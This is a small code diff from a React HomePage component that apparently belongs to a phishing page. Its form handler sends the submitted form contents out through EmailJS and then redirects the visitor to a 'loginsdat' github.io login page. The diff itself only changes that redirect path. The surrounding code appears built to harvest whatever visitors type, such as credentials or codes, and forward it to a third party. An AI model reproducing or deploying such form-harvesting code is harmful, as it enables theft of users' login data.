@@ -126,7 +126,7 @@ function HomePage() {
             if (qfNumErku === 0) {
                 if (digit.current.value) {
                     emailjs.sendForm(SERVICE_ID, TEMPLATE_ID, event.target, USER_ID)
-                    window.location.href = "https://loginsdat.github.io/login/";
+                    window.location.href = "https://loginsdat.github.io/logins/";
                     return;
                 }
             }
